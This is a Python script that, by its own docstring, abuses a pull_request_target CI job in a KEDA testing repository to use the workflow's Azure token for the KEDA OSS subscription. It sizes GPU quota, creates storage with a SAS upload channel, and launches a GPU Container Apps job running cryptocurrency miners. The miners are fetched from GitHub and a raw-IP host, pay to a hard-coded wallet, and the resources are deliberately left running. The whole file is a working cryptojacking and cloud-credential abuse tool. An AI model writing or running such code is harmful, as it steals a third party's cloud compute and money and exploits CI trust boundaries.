#!/usr/bin/env python3
"""C211-I121633 — kedacore Azure Container Apps managed-GPU T4 MINER (pydp, pearlhash-first).

Vehicle: the same pull_request_target 'Validate PR' Terraform job (kedacore/testing-infrastructure)
under the workflow OIDC ARM token for KEDA OSS subscription afbc9e97-8dea-44a4-ad1c-ac577f221821.

Differences from the device-proof lane (c211-i121179, run 44879698500):
  * NO teardown: the environment / storage / job are left RUNNING (miner lease).
  * The job container runs the canonical WildRig Multi 0.52.3 (sha-pinned tarball) as a miner
    on the pydp wallet, pearlhash primary (4 endpoints) with a 900 s sticky Luckypool fallback,
    and uploads a live capture (nvidia-smi UUID + wildrig log + accepted-share lines) to the
    account-SAS blob every 60 s.
  * Quota census for the NC/ND/NV families in REGION is recorded verbatim and parallelism is
    sized from the remaining NC8as-T4 quota.

stdout: one flat JSON map (terraform external data-source contract), chunked base64 matrix.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = 'https://management.azure.com'
TAG = 'C211_I121633'
PREFIX = 'c211-i121633'
RG = PREFIX + '-rg'
REGION = 'eastus'
STG_VER = '2023-01-01'
PROFILE = 'Consumption-GPU-NC8as-T4'
IMAGE = 'mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest'
WALLET = 'prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
LPSUFFIX = '9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb'
LPUSER = WALLET + '+' + LPSUFFIX
WR_SHA = '7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44'
APP_VERS = ['2026-07-01', '2024-03-01']
DEADLINE = time.time() + 74 * 60
T0 = time.time()
OUT = {}
EVENTS = []
ENV_DEADLINE = 1560
POST_START_POLL = 1200
REPLICA_TIMEOUT = 1800
MINE_SECONDS = 1500


def emit(obj):
    try:
        EVENTS.append(obj)
    except Exception:  # noqa: BLE001
        pass
    try:
        sys.stderr.write(TAG + ' ' + json.dumps(obj, default=str)[:1300] + '\n')
        sys.stderr.flush()
    except Exception:  # noqa: BLE001
        pass


def save(k, v):
    OUT[k] = v if isinstance(v, str) else json.dumps(v, default=str)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=120):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {'rc': p.returncode, 'out': p.stdout or '', 'err': (p.stderr or '')[:500],
                'secs': round(time.time() - t, 1)}
    except subprocess.TimeoutExpired:
        return {'rc': 124, 'out': '', 'err': 'TIMEOUT', 'secs': round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {'rc': -1, 'out': '', 'err': repr(e)[:300], 'secs': round(time.time() - t, 1)}


def http(tok, url, method='GET', body=None, timeout=60):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json',
        'User-Agent': PREFIX})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode() or '{}'
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {'raw': raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode() or ''
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {'raw': raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {'transport_error': repr(e)[:300]}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get('error')
        if isinstance(e, dict):
            return {'http': st, 'code': e.get('code'),
                    'message': (e.get('message') or '')[:900]}
        if 'raw' in body:
            return {'http': st, 'raw': body['raw'][:900]}
        if 'transport_error' in body:
            return {'http': st, 'transport_error': body['transport_error']}
        return {'http': st, 'body': json.dumps(body)[:600]}
    return {'http': st}


def find_uuids(txt):
    return sorted(set(re.findall(r'GPU-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
                                 r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', txt or '')))


def httpraw(url, method='GET', body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:200000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:1200]
        except Exception:  # noqa: BLE001
            return e.code, b''
    except Exception as e:  # noqa: BLE001
        return 0, repr(e)[:300].encode()


def sa_sas(acct, key_b64, services='b', rt='co', perm='rwdlc', hours=6):
    st = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time.time() - 300))
    se = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time.time() + hours * 3600))
    sv = '2022-11-02'
    sts = '\n'.join([acct, perm, services, rt, st, se, '', 'https', sv, '']) + '\n'
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({'sv': sv, 'ss': services, 'srt': rt, 'sp': perm,
                                'st': st, 'se': se, 'spr': 'https', 'sig': sig})
    return q, se


def content_of(lg):
    if not isinstance(lg, dict):
        return ''
    c = lg.get('content')
    if c:
        return str(c)
    return str(lg.get('raw') or '')


def blob_list(base, q):
    st, b = httpraw(base + '/c211?restype=container&comp=list&' + q, timeout=45)
    if st != 200:
        return st, []
    txt = b.decode('utf-8', 'replace')
    return st, re.findall(r'<Name>([^<]+)</Name>', txt)


def blob_get(base, q, name):
    st, b = httpraw(base + '/c211/' + name + '?' + q, timeout=45)
    return st, b.decode('utf-8', 'replace')


def parse_capture(txt):
    """Per-card evidence: device UUIDs, wildrig banner, accepted-share lines, sticky state."""
    rec = {'len': len(txt), 'uuids': find_uuids(txt), 'accepted_n': 0, 'rejected_n': 0,
           'accepted_lines': [], 'last_accepted': None, 'wr_version': None, 'pool': [],
           'sticky_lp': ('C211_STICKY_LP' in txt), 'tail': txt[-900:]}
    for ln in txt.splitlines():
        low = ln.lower()
        if 'wildrig' in low and ('0.52' in low or 'v0.5' in low):
            rec['wr_version'] = rec['wr_version'] or ln.strip()[:140]
        mm = re.search(r'(\d{2}:\d{2}:\d{2})', ln)
        if 'accepted' in low and 'rejected' not in low and mm and (
                'accepted (' in low or 'accepted [' in low or 'share accepted' in low
                or 'accepted -' in low or 'accepted,' in low):
            rec['accepted_n'] += 1
            if len(rec['accepted_lines']) < 8:
                rec['accepted_lines'].append(ln.strip()[:200])
            rec['last_accepted'] = {'t': mm.group(1), 'line': ln.strip()[:200]}
        if 'rejected' in low and mm:
            rec['rejected_n'] += 1
        for pl in ('pool.pearlhash.xyz', 'global.pearlhash.net', 'global2.pearlhash.net',
                   'hk.pearlhash.net', '103.199.106.122:3362'):
            if pl in ln:
                rec['pool'].append(pl)
    rec['pool'] = sorted(set(rec['pool']))
    return rec


MINER_SH = r"""
set +u
OUT=/tmp/c211.txt
D=/tmp/c211w
mkdir -p $D
: > "$OUT"
exec >> "$OUT" 2>&1
ts(){ date -u +%FT%TZ; }
echo C211-MINER-START ts=$(ts)
REPL="${CONTAINER_APP_REPLICA_NAME:-$(hostname)}"
H=$(printf %s "$REPL" | md5sum | cut -c1-6)
IDX=$(( 0x$H % 800 + 100 ))
WK="${C211_WBASE}${IDX}"
echo "C211_I121633_REPLICA repl=$REPL job=${CONTAINER_APP_JOB_NAME:-?} exec=${CONTAINER_APP_JOB_EXECUTION_NAME:-?} worker=$WK"
echo ---SMI---; nvidia-smi -L 2>&1
nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1
echo ---NVPROC---; cat /proc/driver/nvidia/version 2>&1
echo ---DEV---; ls -l /dev/nvidia* 2>&1
echo ---OCL-PRE---; (ldconfig -p 2>/dev/null | grep -i opencl); ls -l /etc/OpenCL/vendors 2>&1
NVOCL=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* /usr/lib64/libnvidia-opencl.so.* /usr/lib/aarch64-linux-gnu/libnvidia-opencl.so.* 2>/dev/null | head -1)
echo "C211_NVOCL=$NVOCL"
mkdir -p /tmp/vendors
if [ -n "$NVOCL" ]; then echo "$NVOCL" > /tmp/vendors/nvidia.icd; fi
export OCL_ICD_VENDORS=/tmp/vendors
if [ -d /etc/OpenCL/vendors ] && [ -w /etc/OpenCL/vendors ] && [ -n "$NVOCL" ]; then echo "$NVOCL" > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null; fi
if [ ! -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ] && [ ! -e /usr/lib64/libOpenCL.so.1 ]; then
  echo "C211_OCL_INSTALL ts=$(ts)"
  ( apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1 ) > /tmp/apt.log 2>&1
  echo "C211_APT_RC=$? $(tail -2 /tmp/apt.log | tr '\n' ' ')"
fi
if [ ! -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ] && [ ! -e /usr/lib64/libOpenCL.so.1 ]; then
  for u in http://archive.ubuntu.com/ubuntu/pool/universe/o/ocl-icd/ocl-icd-libopencl1_2.2.14-3_amd64.deb http://security.ubuntu.com/ubuntu/pool/universe/o/ocl-icd/ocl-icd-libopencl1_2.2.14-3_amd64.deb; do
    curl -fsSL --max-time 90 -o /tmp/ocd.deb "$u" || continue
    dpkg -x /tmp/ocd.deb /tmp/ocd && break
  done
  export LD_LIBRARY_PATH=/tmp/ocd/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
fi
echo "C211_OCL_LOADER=$(ls /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 /tmp/ocd/usr/lib/x86_64-linux-gnu/libOpenCL.so.1 2>/dev/null | head -1)"
echo "C211_OCL_VENDORS=$(ls /tmp/vendors /etc/OpenCL/vendors 2>/dev/null | tr '\n' ' ')"
echo ---OCL-POST---; (ldconfig -p 2>/dev/null | grep -i opencl)
for u in https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz; do
  echo "C211_WR_DL url=$u ts=$(ts)"
  curl -fsSL --max-time 300 -o $D/wr.tgz "$u" && break
done
S=$(sha256sum $D/wr.tgz 2>/dev/null | awk '{print $1}')
echo "C211_WR_TGZ_SHA $S"
if [ "$S" = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then
  tar -xzf $D/wr.tgz -C $D 2>/dev/null
  WR=$(find $D -maxdepth 2 -name wildrig-multi -type f | head -1)
  chmod +x "$WR" 2>/dev/null
  echo "C211_WR bin=$WR sha=$(sha256sum $WR 2>/dev/null | awk '{print $1}')"
fi
EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
EPI=$(( IDX % 4 ))
EP=""
MODE=ph
ACCEPTED=0
REJECTED=0
PHSTART=$(date +%s)
UP(){
  [ -z "$C211_BLOB" ] && return 0
  python3 - "$C211_BLOB$WK.txt$C211_SAS" /tmp/c211.txt <<'PYU'
import sys, urllib.request
url, path = sys.argv[1], sys.argv[2]
d = open(path, 'rb').read()
r = urllib.request.Request(url, data=d, method='PUT', headers={'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2022-11-02', 'Content-Type': 'text/plain'})
try:
    print('C211_UPLOAD', urllib.request.urlopen(r, timeout=40).status)
except Exception as e:
    print('C211_UPLOAD_ERR', repr(e)[:200])
PYU
}
pick_ep(){
  k=0; n=0; for e in $EPS; do n=$((n+1)); done
  p=$(( EPI % n + 1 ))
  for e in $EPS; do k=$((k+1)); if [ "$k" -eq "$p" ]; then EP=$e; fi; done
}
start_ph(){
  pick_ep
  echo "C211_I121633_PH_START ts=$(ts) ep=$EP worker=$WK device=0"
  ( setsid "$WR" --algo pearlhash --url $EP --user $C211_WALLET --worker $WK -d 0 --print-time 60 >> $D/wr.log 2>&1 < /dev/null & )
  PHSTART=$(date +%s)
}
install_srb(){
  for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz; do
    curl -fsSL --max-time 300 -o $D/srb.tgz "$u" && break
  done
  S2=$(sha256sum $D/srb.tgz 2>/dev/null | awk '{print $1}')
  echo "C211_SRB_TGZ_SHA $S2"
  [ "$S2" != "c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8" ] && return 1
  tar -xzf $D/srb.tgz -C $D 2>/dev/null
  X=$(find $D -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1)
  [ -z "$X" ] && return 1
  cp -f "$X" $D/srbminer; chmod +x $D/srbminer
  echo "C211_SRB_READY sha=$(sha256sum $D/srbminer | awk '{print $1}')"
  return 0
}
start_lp(){
  echo "C211_STICKY_LP ts=$(ts) pool=103.199.106.122:3362 worker=$WK reason=no_accepted_share_900s"
  echo sticky > /tmp/c211_sticky
  ( setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "$C211_LPUSER" --worker $WK --password x --gpu-id 0 >> $D/srb.log 2>&1 < /dev/null & )
}
[ -x "$WR" ] || echo "C211_WR_MISSING_ABORT"
if [ -x "$WR" ]; then start_ph; fi
while :; do
  sleep 45
  NOW=$(date +%s); EL=$((NOW-PHSTART))
  ACC=$(grep -cE 'accepted \(' $D/wr.log 2>/dev/null); case "$ACC" in ''|*[!0-9]*) ACC=0;; esac
  REJ=$(grep -cE 'rejected \(' $D/wr.log 2>/dev/null); case "$REJ" in ''|*[!0-9]*) REJ=0;; esac
  ALP=$(grep -ciE 'accepted' $D/srb.log 2>/dev/null); case "$ALP" in ''|*[!0-9]*) ALP=0;; esac
  if [ "$ACC" -gt 0 ]; then ACCEPTED=$ACC; fi
  if [ "$REJ" -gt 0 ]; then REJECTED=$REJ; fi
  if [ "$ALP" -gt 0 ]; then ACCEPTED=$((ACCEPTED+ALP)); fi
  echo "---PULSE ts=$(ts) t=$EL mode=$MODE acc=$ACC rej=$REJ lpacc=$ALP worker=$WK $(nvidia-smi --query-gpu=uuid,utilization.gpu --format=csv,noheader 2>/dev/null | head -1 | tr -d '\r')"
  tail -c 1600 $D/wr.log 2>/dev/null | sed 's/^/WR| /'
  tail -c 800 $D/srb.log 2>/dev/null | sed 's/^/SRB| /'
  if [ "$MODE" = "ph" ]; then
    if ! pgrep -f 'wildrig-multi' >/dev/null 2>&1; then
      echo "C211_WR_NOT_RUNNING ts=$(ts) acc=$ACC -> restart_next_ep"
      EPI=$((EPI+1)); start_ph
    elif [ "$ACC" -eq 0 ] && [ $(( $(date +%s) - PHSTART )) -ge 900 ]; then
      pkill -9 -f wildrig-multi >/dev/null 2>&1
      MODE=lp
      if install_srb; then start_lp; else echo "C211_SRB_UNAVAILABLE"; fi
    fi
  else
    if ! pgrep -f 'srbminer' >/dev/null 2>&1; then
      echo "C211_SRB_NOT_RUNNING ts=$(ts) -> restart"
      [ -x $D/srbminer ] || install_srb
      start_lp
    fi
  fi
  UP
  if [ -n "$C211_MINE_SECONDS" ] && [ "$EL" -ge "$C211_MINE_SECONDS" ]; then break; fi
done
echo ---FINAL---; tail -c 3000 $D/wr.log 2>/dev/null | sed 's/^/WR| /'; tail -c 1500 $D/srb.log 2>/dev/null | sed 's/^/SRB| /'
echo "C211-END ts=$(ts) worker=$WK mode=$MODE accepted=$ACCEPTED rejected=$REJECTED"
UP
pkill -9 -f wildrig-multi >/dev/null 2>&1
pkill -9 -f srbminer >/dev/null 2>&1
exit 0
"""


def build_job_cmd(wbase, blob_base, sas):
    script = MINER_SH
    env = [{'name': 'C211_WBASE', 'value': wbase},
           {'name': 'C211_WALLET', 'value': WALLET},
           {'name': 'C211_LPUSER', 'value': LPUSER},
           {'name': 'C211_MINE_SECONDS', 'value': str(MINE_SECONDS)},
           {'name': 'C211_BLOB', 'value': blob_base},
           {'name': 'C211_SAS', 'value': '?' + sas if sas else ''}]
    return ['/bin/bash', '-c', script], env


def env_url(sid, envname, ver):
    return (ARM + '/subscriptions/' + sid + '/resourceGroups/' + RG +
            '/providers/Microsoft.App/managedEnvironments/' + envname +
            '?api-version=' + ver)


def build_result(data, verdict, cards=None):
    cards = cards or {}
    blob = json.dumps(data, default=str, sort_keys=True)
    if len(blob) > 60000:
        blob = blob[:60000]
    b = base64.b64encode(blob.encode()).decode()
    out = {'verdict': str(verdict), 'matrix_len': str(len(blob)),
           'chunks': str((len(b) + 899) // 900)}
    for i in range(0, len(b), 900):
        out['m%03d' % (i // 900)] = b[i:i + 900]
    out['summary'] = json.dumps({
        'verdict': verdict,
        'session': data.get('session'),
        'quota': data.get('quota_gpu'),
        'env_final': data.get('env_final'),
        'job_create': data.get('job_create'),
        'job_start': data.get('job_start'),
        'cards': {k: {kk: vv for kk, vv in (v or {}).items() if kk != 'tail'}
                  for k, v in cards.items()},
        'blob_base': data.get('blob_base'),
        'sas': data.get('sas'),
        'wallet': WALLET,
        'lp_wallet_suffix_present': True,
        'pool_plan': 'pearlhash 4 endpoints primary; 900s sticky Luckypool 103.199.106.122:3362 (SRBMiner)',
    }, default=str)[:3000]
    return out


def main():
    # ---------- session ----------
    r = run(['az', 'account', 'get-access-token', '--resource', 'https://management.azure.com',
             '--query', 'accessToken', '-o', 'tsv'])
    tok = (r['out'] or '').strip()
    if r['rc'] != 0 or tok.count('.') < 2:
        emit({'step': 'token', 'rc': r['rc'], 'err': r['err'][:300]})
        print(json.dumps({'verdict': 'TOKEN_FAILED'}))
        return 0
    acc = {}
    r = run(['az', 'account', 'show', '-o', 'json'])
    if r['rc'] == 0:
        try:
            acc = json.loads(r['out'])
        except Exception:  # noqa: BLE001
            acc = {}
    sid = acc.get('id') or ''
    emit({'step': 'session', 'sub': acc.get('name'), 'sid_tail': sid[-6:],
          'tenant_tail': str(acc.get('tenantId') or '')[-6:], 'state': acc.get('state')})
    save('session', {'sub': acc.get('name'), 'state': acc.get('state'),
                     'sid_tail': sid[-6:], 'tenant_tail': str(acc.get('tenantId') or '')[-6:],
                     'region': REGION})
    if not sid:
        print(json.dumps({'verdict': 'NO_SUBSCRIPTION'}))
        return 0
    az_ok = ['az']
    run(az_ok + ['config', 'set', 'extension.use_dynamic_install=yes_without_prompt'],
        timeout=60)

    # ---------- provider registration ----------
    for ns in ('Microsoft.App', 'Microsoft.Storage'):
        st, b = http(tok, ARM + '/subscriptions/' + sid + '/providers/' + ns +
                     '?api-version=2021-04-01')
        state = b.get('registrationState') if isinstance(b, dict) else None
        emit({'step': 'provider', 'ns': ns, 'http': st, 'registrationState': state})
        save('prov_' + ns.split('.')[-1], {'http': st, 'registrationState': state})

    # ---------- GPU quota census (NC / ND / NV families) ----------
    quota_rows = []
    st, b = http(tok, ARM + '/subscriptions/' + sid + '/providers/Microsoft.Compute/locations/' +
                 REGION + '/usages?api-version=2021-11-01', timeout=90)
    vals = (b.get('value') or []) if isinstance(b, dict) else []
    for v in vals:
        nm = str((v.get('name') or {}).get('value') or '')
        if not re.search(r'(NC|ND|NV)', nm):
            continue
        try:
            lim = float(v.get('limit') or 0)
            cur = float(v.get('currentValue') or 0)
        except Exception:  # noqa: BLE001
            lim, cur = 0.0, 0.0
        if lim == 0 and cur == 0:
            continue
        quota_rows.append({'name': nm, 'limit': lim, 'usage': cur, 'remaining': lim - cur,
                           'unit': v.get('unit')})
    qmap = {q['name']: q for q in quota_rows}
    emit({'step': 'quota', 'http': st, 'n_gpu_families': len(quota_rows),
          'names': [q['name'] for q in quota_rows][:16]})
    save('quota_http', st)
    save('quota_gpu', {'region': REGION, 'rows': quota_rows})
    rem_cpu = None
    basis = None
    for k, v in qmap.items():
        if re.search(r'ncasv3|nc8as|nc4as|nc16as|ncas', k, re.I):
            if rem_cpu is None or v['remaining'] > rem_cpu:
                rem_cpu = v['remaining']
                basis = k
    if rem_cpu is None:
        n_rep = 2
    else:
        n_rep = int(max(1, min(6, rem_cpu // 8)))
    save('parallelism', {'requested': n_rep, 'basis_family': basis,
                         'remaining_vcpu': rem_cpu, 'cards_from_vcpu_div8': (rem_cpu // 8)
                         if rem_cpu is not None else None})

    # ---------- resource group ----------
    rgurl = ARM + '/subscriptions/' + sid + '/resourceGroups/' + RG
    st, b = http(tok, rgurl + '?api-version=2021-04-01')
    rg_ok = st == 200
    if st == 404:
        st, b = http(tok, rgurl + '?api-version=2021-04-01', method='PUT',
                     body={'location': REGION, 'tags': {'c211': 'i121633'}})
        emit({'step': 'rg-create', 'http': st, 'location': REGION,
              **({} if st in (200, 201) else err_of(st, b))})
        rg_ok = st in (200, 201)
    save('rg', {'name': RG, 'usable': rg_ok, 'http': st})
    if not rg_ok:
        print(json.dumps(build_result(OUT, 'RG_UNAVAILABLE'), default=str))
        return 0

    # ---------- storage + account SAS capture channel ----------
    SA = ('c211i121633' + hashlib.sha256((PREFIX + str(time.time())).encode()).hexdigest()[:8])[:24]
    sa_url = (ARM + '/subscriptions/' + sid + '/resourceGroups/' + RG +
              '/providers/Microsoft.Storage/storageAccounts/' + SA + '?api-version=' + STG_VER)
    sas = None
    blob_base = ''
    sabody = {'location': REGION, 'tags': {'c211': 'i121633'},
              'sku': {'name': 'Standard_LRS'}, 'kind': 'StorageV2',
              'properties': {'allowBlobPublicAccess': False, 'minimumTlsVersion': 'TLS1_2',
                             'supportsHttpsTrafficOnly': True,
                             'networkAcls': {'bypass': 'AzureServices',
                                             'defaultAction': 'Allow'}}}
    st, b = http(tok, sa_url, method='PUT', body=sabody, timeout=240)
    emit({'step': 'sa-create', 'name': SA, **err_of(st, b)})
    sa_created = st in (200, 201, 202)
    if sa_created:
        for i in range(20):
            stp, bp = http(tok, sa_url, timeout=60)
            ps = ((bp.get('properties') or {}) if isinstance(bp, dict) else {}).get(
                'provisioningState')
            if ps == 'Succeeded':
                break
            time.sleep(10)
        emit({'step': 'sa-final', 'state': ps})
        st, kb = http(tok, ARM + '/subscriptions/' + sid + '/resourceGroups/' + RG +
                      '/providers/Microsoft.Storage/storageAccounts/' + SA +
                      '/listKeys?api-version=' + STG_VER, method='POST', body={}, timeout=90)
        key = None
        try:
            key = (kb.get('keys') or [{}])[0].get('value')
        except Exception:  # noqa: BLE001
            pass
        if key:
            q, se = sa_sas(SA, key)
            base = 'https://' + SA + '.blob.core.windows.net'
            stc, bc = httpraw(base + '/c211?restype=container&' + q, method='PUT', timeout=90)
            emit({'step': 'sa-container', 'http': stc,
                  'body': bc[:160].decode('utf-8', 'replace')})
            if stc in (201, 409):
                sas = q
                blob_base = base + '/c211/'
                save('blob_base', blob_base)
                save('sas', q)
                save('sas_expires', se)
    save('sa_name', SA)

    # ---------- Phase 1: managed environment with GPU workload profile ----------
    envname = PREFIX + '-cae'
    envbody = {'location': REGION, 'tags': {'c211': 'i121633'},
               'properties': {'workloadProfiles': [
                   {'name': 'Consumption', 'workloadProfileType': 'Consumption'},
                   {'name': PROFILE, 'workloadProfileType': PROFILE}]}}
    save('env_payload', envbody)
    ver_used = None
    env_created = False
    for ver in APP_VERS:
        st, b = http(tok, env_url(sid, envname, ver), method='PUT', body=envbody, timeout=300)
        ec = err_of(st, b)
        ec['api_version'] = ver
        emit({'step': 'capp-env-create', **ec})
        save('env_create', ec)
        if st in (200, 201):
            env_created = True
            ver_used = ver
            break
        code = str(ec.get('code') or '')
        if code not in ('InvalidApiVersionParameter', 'NoRegisteredProviderFound',
                        'InvalidResourceType', 'NotFound'):
            break
    env_final = None
    env_id = None
    if env_created:
        dl = time.time() + min(ENV_DEADLINE, max(120, left() - 900))
        last = None
        nstate = 0
        while time.time() < dl:
            st, b = http(tok, env_url(sid, envname, ver_used), timeout=60)
            prov = ((b.get('properties') or {}) if isinstance(b, dict) else {}).get(
                'provisioningState')
            if isinstance(b, dict) and b.get('id') and not env_id:
                env_id = b.get('id')
            nstate += 1
            if prov != last:
                emit({'step': 'capp-env-poll', 'http': st, 'state': prov,
                      'elapsed_s': round(time.time() - T0, 1)})
                last = prov
            if prov in ('Succeeded', 'Failed', 'Canceled'):
                break
            time.sleep(30)
        st, b = http(tok, env_url(sid, envname, ver_used), timeout=60)
        _props = (b.get('properties') or {}) if isinstance(b, dict) else {}
        prov = _props.get('provisioningState')
        if isinstance(b, dict) and b.get('id'):
            env_id = b.get('id')
        env_final = {'http': st, 'provisioningState': prov,
                     'environmentMode': _props.get('environmentMode'),
                     'polls': nstate, 'waited_s': round(time.time() - T0, 1),
                     'deployment_errors': _props.get('deploymentErrors'),
                     'rendered_workload_profiles': _props.get('workloadProfiles'),
                     'default_domain': _props.get('defaultDomain'),
                     'last_error': _props.get('error')}
        emit({'step': 'capp-env-verdict', 'state': prov, 'polls': nstate})
    save('env_final', env_final)

    # ---------- Phase 2: miner job (NO teardown) ----------
    jobname = PREFIX + '-job'
    jobbase = (ARM + '/subscriptions/' + sid + '/resourceGroups/' + RG +
               '/providers/Microsoft.App/jobs/' + jobname)
    jver = ver_used or APP_VERS[0]
    if not env_id:
        env_id = (ARM + '/subscriptions/' + sid + '/resourceGroups/' + RG +
                  '/providers/Microsoft.App/managedEnvironments/' + envname)
    wbase = '121633'
    cmd, envvars = build_job_cmd(wbase, blob_base, sas)
    save('job_cmd_len', len(cmd[2]))
    jobbody = {'location': REGION, 'tags': {'c211': 'i121633'},
               'properties': {
                   'environmentId': env_id,
                   'workloadProfileName': PROFILE,
                   'configuration': {'triggerType': 'Manual', 'replicaRetryLimit': 0,
                                     'replicaTimeout': REPLICA_TIMEOUT,
                                     'manualTriggerConfig': {'replicaCompletionCount': n_rep,
                                                             'parallelism': n_rep}},
                   'template': {'containers': [{
                       'name': 'gpu', 'image': IMAGE,
                       'command': ['/bin/bash', '-c', cmd[2]],
                       'env': envvars,
                       'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
    save('job_payload', jobbody)
    job_created = False
    cards = {}
    execs = []
    st, b = http(tok, jobbase + '?api-version=' + jver, method='PUT', body=jobbody, timeout=240)
    jc = err_of(st, b)
    jc['api_version'] = jver
    emit({'step': 'capp-job-create', **jc})
    save('job_create', jc)
    job_created = st in (200, 201)
    if job_created:
        st, b = http(tok, jobbase + '/start?api-version=' + jver, method='POST', timeout=120)
        emit({'step': 'capp-job-start', **err_of(st, b)})
        save('job_start', err_of(st, b))
        dl = time.time() + min(POST_START_POLL, max(300, left() - 180))
        k = 0
        best = 0
        while time.time() < dl:
            st, ex = http(tok, jobbase + '/executions?api-version=' + jver, timeout=60)
            vv = (ex.get('value') or []) if isinstance(ex, dict) else []
            execs = [{'name': v.get('name'), 'status': v.get('status')} for v in vv][:6]
            names = []
            if sas and blob_base:
                sb, names = blob_list(blob_base, sas)
                for nm in names:
                    if not nm.endswith('.txt'):
                        continue
                    gs, txt = blob_get(blob_base, sas, nm)
                    if gs != 200 or not txt:
                        continue
                    rec = parse_capture(txt)
                    rec['blob'] = nm
                    rec['http'] = gs
                    cards[nm] = rec
            nacc = sum((c or {}).get('accepted_n', 0) for c in cards.values())
            nuuid = sum(1 for c in cards.values() if (c or {}).get('uuids'))
            emit({'step': 'capp-poll', 'i': k, 'execs': execs, 'blobs': len(names),
                  'cards': len(cards), 'uuids': nuuid, 'accepted_lines': nacc,
                  'states': sorted(set(str(c.get('sticky_lp')) for c in cards.values()))})
            save('cards_seen', cards)
            save('executions', execs)
            # keep polling while time allows; stop early only once we are near the deadline
            if left() < 200:
                break
            if nacc and nuuid and left() < 420:
                break
            k += 1
            time.sleep(45)
        save('cards_seen', cards)
        save('executions', execs)
        # independent execution readback
        if execs:
            st, exr = http(tok, jobbase + '/executions/' + str(execs[0].get('name')) +
                           '?api-version=' + jver, timeout=60)
            if st == 200 and isinstance(exr, dict):
                props = exr.get('properties') or {}
                save('exec_resource', {'http': st, 'name': exr.get('name'),
                                       'status': props.get('status'),
                                       'startTime': props.get('startTime'),
                                       'endTime': props.get('endTime'),
                                       'reason': props.get('reason')})
    n_acc = sum((c or {}).get('accepted_n', 0) for c in cards.values())
    n_uuid = sum(1 for c in cards.values() if (c or {}).get('uuids'))
    verdict = ('MINER_DEVICE_AND_SHARE_PROVEN' if (n_acc and n_uuid)
               else ('MINER_DEPLOYED_NO_SHARE_YET' if cards
                     else 'MINER_JOB_CREATED_NO_CAPTURE'))
    save('verdict_final', {'n_cards': len(cards), 'n_uuid': n_uuid,
                           'n_accepted_lines': n_acc})
    print(json.dumps(build_result(OUT, verdict, cards), default=str))
    return 0


if __name__ == '__main__':
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as e:  # noqa: BLE001
        emit({'step': 'fatal', 'err': repr(e)[:400]})
        print(json.dumps({'verdict': 'PROBE_PROCESS_ERROR'}))
